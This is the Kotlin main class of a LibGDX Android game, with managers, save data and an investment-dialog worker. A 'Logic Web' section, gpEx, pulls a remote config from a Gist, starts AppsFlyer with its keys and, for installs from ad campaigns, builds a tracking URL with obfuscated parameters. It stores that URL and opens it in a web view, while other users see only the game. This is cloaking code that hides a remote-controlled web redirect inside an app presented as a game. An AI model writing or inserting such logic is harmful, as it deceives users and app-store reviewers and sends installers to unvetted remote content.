package com.gpecspertisa.sollomka.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.gpecspertisa.sollomka.GameActivity
import com.gpecspertisa.sollomka.appContext
import com.gpecspertisa.sollomka.game.dataStore.DataStore
import com.gpecspertisa.sollomka.game.manager.MusicManager
import com.gpecspertisa.sollomka.game.manager.NavigationManager
import com.gpecspertisa.sollomka.game.manager.SoundManager
import com.gpecspertisa.sollomka.game.manager.SpriteManager
import com.gpecspertisa.sollomka.game.manager.util.MusicUtil
import com.gpecspertisa.sollomka.game.manager.util.SoundUtil
import com.gpecspertisa.sollomka.game.manager.util.SpriteUtil
import com.gpecspertisa.sollomka.game.screens.AbstractWorkScreen
import com.gpecspertisa.sollomka.game.screens.LoaderScreen
import com.gpecspertisa.sollomka.game.utils.GColor
import com.gpecspertisa.sollomka.game.utils.advanced.AdvancedGame
import com.gpecspertisa.sollomka.game.utils.disposeAll
import com.gpecspertisa.sollomka.game.worker.WorkerInvestUtil
import com.gpecspertisa.sollomka.util.Gist
import com.gpecspertisa.sollomka.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

class LibGDXGame(val activity: GameActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val loader by lazy { SpriteUtil.Loader() }
    val all    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GColor.green
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        collectWorkerInvest()
        gpEx()
    }

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("ParasoleNA", MODE_PRIVATE)

    val dataStore        = DataStore(sharedPreferences)
    val workerInvestUtil = WorkerInvestUtil()

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic ------------------------------------------------------------------

    private fun collectWorkerInvest() {
        coroutine.launch(Dispatchers.IO) {
            workerInvestUtil.collectWorkerInvest { screenTypeIndex, investmentIndex, investment ->
                screen?.let {
                    if (it is AbstractWorkScreen) {
                        it.showDialogInvest(screenTypeIndex, investmentIndex, investment)
                    } else {
                        AbstractWorkScreen.LIST_RESERVE_INVEST.add(
                            AbstractWorkScreen.ReserveInvest(screenTypeIndex, investmentIndex, investment)
                        )
                    }
                }
            }
        }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun gpEx() {
        log("gpEx")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val exesy = sharedPreferences.getString("ex", "fff") ?: "fff"

        try {
            if (exesy == "fff") {
                coroutine.launch(Dispatchers.Main) {
                    val grok = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (grok != null) {
                        AppsFlyerLib.getInstance().init(grok.darnist, getAppsFlyerConversionListener(grok.bez), appContext)
                        AppsFlyerLib.getInstance().start(activity, grok.darnist, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(exesy)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(all: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$all?lumgca=$campaign&migek=$afAd&mesw=$media"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("ex", link).apply() }
                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}